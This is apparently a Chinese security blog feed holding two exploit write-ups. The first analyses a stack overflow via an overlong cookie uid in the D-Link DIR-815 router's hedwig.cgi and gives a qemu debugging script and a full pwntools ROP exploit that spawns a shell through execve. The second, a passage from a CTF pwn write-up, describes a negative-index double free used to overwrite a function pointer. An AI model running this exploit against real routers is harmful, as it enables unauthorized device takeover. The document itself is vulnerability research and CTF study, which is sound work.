<p>继续往下看，需要校验<code>REQUEST_METHOD=POST</code>，通过sess_get_uid函数获取环境变量中的uid保存到v6，在sess_get_uid函数中需要给出<code>HTTP_COOKIE</code>和<code>REMOTE_ADDR</code>，所有通过环境变量获取的字符串会通过<code>sobj_add_string</code>拼接起来返回给上层函数.</p>
<p>sprintf不会限制拷贝的字节数，输入过长的uid造成栈溢出。之后需要创建一个<code>/var/tmp/temp.xml</code>文件且赋予可写权限，在下面还有一个sprintf存在溢出，这里我们只拿第一个做利用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hedwigcgi_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// $a1</span></span><br><span class="line">  FILE *v2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $fp</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $s5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// $s7</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> **v11; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v14; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v17; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v22[<span class="number">20</span>]; <span class="comment">// [sp-4D0h] [-4D0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v23; <span class="comment">// [sp-4BCh] [-4BCh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v24; <span class="comment">// [sp-4B8h] [-4B8h]</span></span><br><span class="line">  _DWORD v25[<span class="number">3</span>]; <span class="comment">// [sp-4B4h] [-4B4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v26[<span class="number">128</span>]; <span class="comment">// [sp-4A8h] [-4A8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v27[<span class="number">1064</span>]; <span class="comment">// [sp-428h] [-428h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v26, <span class="number">0</span>, <span class="keyword">sizeof</span>(v26));</span><br><span class="line">  <span class="built_in">strcpy</span>(v22, <span class="string">"/runtime/session"</span>);</span><br><span class="line">  v0 = getenv(<span class="string">"REQUEST_METHOD"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"no REQUEST"</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v0, <span class="string">"POST"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unsupported HTTP request"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, <span class="number">0</span>, <span class="number">0x20000</span>);</span><br><span class="line">  v2 = fopen(<span class="string">"/etc/config/image_sign"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(v26, <span class="number">128</span>, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unable to read signature!"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(v2);</span><br><span class="line">  cgibin_reatwhite(v26);</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  v5 = sobj_new();</span><br><span class="line">  v3 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unable to allocate string object"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  sess_get_uid(v4);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(v27, <span class="string">"%s/%s/postxml"</span>, <span class="string">"/runtime/session"</span>, v6);</span><br><span class="line">  xmldbc_del(<span class="number">0</span>, <span class="number">0</span>, v27);</span><br><span class="line">  v7 = fopen(<span class="string">"/var/tmp/temp.xml"</span>, <span class="string">"w"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unable to open temp file."</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"no xml data."</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = fileno(v7);</span><br><span class="line">  v9 = lockf(v8, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">"HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;"</span>,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = fileno(v7);</span><br><span class="line">  lockf(v10, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  v23 = v26;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v24 = strtok(v22, <span class="string">"/"</span>);</span><br><span class="line">  v11 = (<span class="keyword">char</span> **)v25;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = strtok(<span class="number">0</span>, <span class="string">"/"</span>);</span><br><span class="line">    *v11++ = v13;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;v23)[i] = (<span class="keyword">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"</span>, v7);</span><br><span class="line">  v14 = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;v23;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v15;</span><br><span class="line">    <span class="built_in">fprintf</span>(v7, <span class="string">"&lt;%s&gt;\n"</span>, *v14++);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; i + <span class="number">1</span> );</span><br><span class="line">  v16 = <span class="built_in">strstr</span>(haystack, <span class="string">"&lt;postxml&gt;"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(v7, <span class="string">"%s\n"</span>, v16);</span><br><span class="line">  v17 = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;(&amp;v23)[i];</span><br><span class="line">  v18 = i + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v18;</span><br><span class="line">    <span class="built_in">fprintf</span>(v7, <span class="string">"&lt;/%s&gt;\n"</span>, *v17--);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18 &gt; <span class="number">0</span> );</span><br><span class="line">  fflush(v7);</span><br><span class="line">  xmldbc_read(<span class="number">0</span>, <span class="number">2</span>, <span class="string">"/var/tmp/temp.xml"</span>);</span><br><span class="line">  v19 = fileno(v7);</span><br><span class="line">  lockf(v19, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  fclose(v7);</span><br><span class="line">  remove(<span class="string">"/var/tmp/temp.xml"</span>);</span><br><span class="line">  v20 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(v27, <span class="string">"/htdocs/webinc/fatlady.php\nprefix=%s/%s"</span>, <span class="string">"/runtime/session"</span>, v20);</span><br><span class="line">  xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v27, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">"HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;"</span>,</span><br><span class="line">      v1);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sess_get_uid</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// $s4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v2 = sobj_new();</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  v3 = getenv(<span class="string">"HTTP_COOKIE"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">32</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(v2);</span><br><span class="line">      sobj_free(v4);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">59</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="number">61</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v2, v7);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">59</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v4, *v5++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">"uid"</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">"uid"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    v8 = sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  v8 = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  result = sobj_add_string(a1, v8);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = sobj_del(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    result = sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>sprintf函数以零字节为截断符，cgibin的代码段地址为0x0040xxxx，高位必然存在零字节截断，因而无法通过代码段构造rop，这里模拟真机环境下的无地址随机化，使用用户态的qemu-mipsel-static启动固件。假如可以拿到真机，开放ssh服务，通过gdbserver+gdb即可调试真机，cgibin的固件地址可以通过gdb调试得到(系统关闭随机化)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line">PORT=<span class="string">"1234"</span></span><br><span class="line"><span class="built_in">test</span>=$(python -c <span class="string">"print 'uid='+open('test','r').read(2000)"</span>)</span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$test</span>"</span> | wc -c)</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD=<span class="string">"POST"</span> -E HTTP_COOKIE=<span class="variable">$test</span> -E REQUEST_URL=<span class="string">"/hedwig.cgi"</span> -E REMOTE_ADDR=<span class="string">"127.0.0.1"</span> -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi 2&gt;/dev/null rm -f ./qemu</span><br></pre></td></tr></table></figure>
<p>首先需要确定溢出的偏移，在gdb调试到sprintf时使用<code>cyclic 2000</code>生成payload，<code>set {char [2002]} 0x42e0d8 = &quot;&quot;</code>将目标地址的内容强制修改为cyclic字符串，最后使用<code>cyclic -l 61616c6b</code>确定偏移为1043.</p>
<p><img src="/2020/12/19/D-LINK-DIR815-stack-overflow/1.png" alt></p>
<p>观察函数退出时的汇编，可以控制s0-s7,fp和ra。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00409A28                 lw      $ra, 0x4E4($sp)</span><br><span class="line">.text:00409A2C                 move    $v0, $s7</span><br><span class="line">.text:00409A30                 lw      $fp, 0x4E0($sp)</span><br><span class="line">.text:00409A34                 lw      $s7, 0x4DC($sp)</span><br><span class="line">.text:00409A38                 lw      $s6, 0x4D8($sp)</span><br><span class="line">.text:00409A3C                 lw      $s5, 0x4D4($sp)</span><br><span class="line">.text:00409A40                 lw      $s4, 0x4D0($sp)</span><br><span class="line">.text:00409A44                 lw      $s3, 0x4CC($sp)</span><br><span class="line">.text:00409A48                 lw      $s2, 0x4C8($sp)</span><br><span class="line">.text:00409A4C                 lw      $s1, 0x4C4($sp)</span><br><span class="line">.text:00409A50                 lw      $s0, 0x4C0($sp)</span><br><span class="line">.text:00409A54                 jr      $ra</span><br></pre></td></tr></table></figure>
<p>寻找可控参数寄存器<code>a0/a1/a2</code>的寄存器，找到<code>#0x00022760 : move $t9, $s1 ; move $a0, $s5 ; move $a1, $zero ; move $a2, $zero ; jalr $t9 ; move $a3, $s6</code>这样一个完美的gadget，由于system函数末尾为零字节，改为调用execve函数。system函数会启动一个新进程，保留旧进程；而execve函数拿bash进程替换原进程。</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'mips'</span></span><br><span class="line">context.endian =  <span class="string">'little'</span></span><br><span class="line"><span class="comment">#0x0040dc14 : move $a0, $s3 ; jalr $t9 ; move $a1, $s0</span></span><br><span class="line">mov_a0_s3 = <span class="number">0x0040dc14</span></span><br><span class="line"><span class="comment">#0x00404d6c : move $t9, $v1 ; jalr $t9 ; move $a0, $s3</span></span><br><span class="line">mov_t9_v1 = <span class="number">0x00404d6c</span></span><br><span class="line"><span class="comment">#0x00402F84 :lw $a0, 0x4E4($sp) ; lw $t9, 0x4E0($sp) ; jalr    $t9 ;</span></span><br><span class="line"><span class="comment">#0x00046838 : move $t9, $s2 ; move $a0, $s1 ; move $a1, $s7 ; move $a2, $s6 ; move $t9, $s3 ; jalr $t9 ; move $a3, $s5</span></span><br><span class="line">libc_base = <span class="number">0x7f738000</span></span><br><span class="line">magic = libc_base + <span class="number">0x46838</span></span><br><span class="line"><span class="comment">#0x0003a738 : move $a1, $zero ; move $t9, $s0 ; jalr $t9 ; move $a2, $s2</span></span><br><span class="line">magic2 = libc_base + <span class="number">0x3a738</span></span><br><span class="line"><span class="comment">#0x00032198 : move $s0, $zero ; move $t9, $s7 ; jalr $t9 ; move $a0, $s4</span></span><br><span class="line">magic3 = libc_base + <span class="number">0x32198</span></span><br><span class="line"><span class="comment">#0x00028398 : move $a2, $s0 ; move $a1, $s1 ; move $t9, $s3 ; jalr $t9 ; move $a0, $s2</span></span><br><span class="line">magic4 = libc_base + <span class="number">0x28398</span></span><br><span class="line"><span class="comment">#0x00022760 : move $t9, $s1 ; move $a0, $s5 ; move $a1, $zero ; move $a2, $zero ; jalr $t9 ; move $a3, $s6</span></span><br><span class="line">magic5 = libc_base + <span class="number">0x00022760</span></span><br><span class="line">system = <span class="number">0x7f78b200</span><span class="number">-1</span></span><br><span class="line">execv = <span class="number">0x7f78d650</span></span><br><span class="line">execve = <span class="number">0x7f742e90</span></span><br><span class="line">binsh = <span class="number">0x7f792448</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"xmzyshypnc"</span></span><br><span class="line">payload = payload.ljust(<span class="number">1043</span><span class="number">-4</span>*<span class="number">9</span>,<span class="string">b'b'</span>)</span><br><span class="line"><span class="comment">#payload = bytes(payload,encoding="gb2312")</span></span><br><span class="line">payload += p32(magic)  <span class="comment">#s0</span></span><br><span class="line">payload += p32(execve)  <span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">b"aaaa"</span>   <span class="comment">#s2</span></span><br><span class="line">payload += p32(magic2)   <span class="comment">#s3</span></span><br><span class="line">payload += <span class="string">b"aaaa"</span>   <span class="comment">#s4</span></span><br><span class="line">payload += p32(binsh)   <span class="comment">#s5</span></span><br><span class="line">payload += <span class="string">b"a2a2"</span>   <span class="comment">#s6</span></span><br><span class="line">payload += <span class="string">b"a1a1"</span>   <span class="comment">#s7</span></span><br><span class="line">payload += p32(magic4)    <span class="comment">#fp</span></span><br><span class="line">payload += p32(magic5)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'test'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/19/D-LINK-DIR815-stack-overflow/2.png" alt></p>
]]></content>
  </entry>
  <entry>
    <title>第五空间安全大赛</title>
    <url>/2020/09/03/FifthSpcae/</url>
    <content><![CDATA[<h1 id="第五空间安全大赛"><a href="#第五空间安全大赛" class="headerlink" title="第五空间安全大赛"></a>第五空间安全大赛</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比赛给了5道web，15道pwn，队里师傅做的很快，自己做了1之后看了3 10 和 12，12的chunk shrink大概是第一次做到这种题，记录一下通用的思路</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>这道题的漏洞看到了，但是因为自己想当然的问题没有搞出来，记录一下做题的思路</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>程序有Create、Delete、Show三个功能，每次固定分配0x14大小的chunk。注意bss里有个pFunc函数指针会被调用，其调用条件可以查看其引用，在while循环的最后判断choice!=3或4即会跳转到这里，我们的目标就定为覆盖这个函数指针为one_gadget地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+11h] [rbp-Fh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cnt[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( pFunc = (__int64 (__fastcall *)(_QWORD, _QWORD))finish; ; pFunc(&amp;buf, &amp;buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            menu();</span><br><span class="line">            read(<span class="number">0</span>, &amp;buf, <span class="number">2u</span>LL);</span><br><span class="line">            v6 = <span class="number">0</span>;</span><br><span class="line">            choice = atoi(&amp;buf);</span><br><span class="line">            <span class="keyword">if</span> ( choice )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">"Invalid select.\n"</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          show_chunk();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        create_chunk();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      free_chunk();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"bye~\n"</span>, <span class="number">5u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个漏洞是free的时候是从后往前覆盖，当add 0x30个堆块时，Free(index)会造成bss存在两个相同的堆地址。</p>
<p>另一个漏洞存在于free的时候可以输入负数的index，我当时尝试-2、-3之类的不好使就放弃了，后来才注意到这里用的不是atoi而是自己实现的转换函数my_to_num，识别的ascii为0-9，不包含’-‘，因此应该直接输入0xffffffff-1的十进制表示，而Free(0)是不会报错的，我们可以Free cnt前面的地址，从而让pFunc覆盖cnt为一个很大的数字，这样输入index可以绕过检查，造成double free。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> index; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> index1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"id: "</span>, <span class="number">4u</span>LL);</span><br><span class="line">  index = read_int();</span><br><span class="line">  index1 = index;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)index != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)index &lt;= cnt[<span class="number">0</span>] )          <span class="comment">// 负数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)<span class="built_in">list</span>[(<span class="keyword">signed</span> <span class="keyword">int</span>)index]);</span><br><span class="line">      --cnt[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">for</span> ( i = index1; i &lt;= <span class="number">0x2E</span>; ++i )</span><br><span class="line">        <span class="built_in">list</span>[i] = <span class="built_in">list</span>[i + <span class="number">1</span>];                  <span class="comment">// ?</span></span><br><span class="line">      index = write(<span class="number">1</span>, <span class="string">"dele successfully\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      index = write(<span class="number">1</span>, <span class="string">"out of range.\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同理Show可以输入负数泄露list之前的数据，这里很巧妙的是list[-19]处存在一个Libc地址，地址里的值为程序加载基地址，Show即可泄露出来</p>
<p>堆地址其实不必泄露，但是有了UAF也很简单</p>
<p>libc地址的泄露需要我们在bss上构造一个函数的got表地址，因为我们的chunk大小都是0x21，我们通过free将cnt[0]减为0x21，构造fake chunk，即可覆写bss地址，从而泄露libc</p>
<p>再来一次double free，覆写pFunc为one_gadget即可</p>
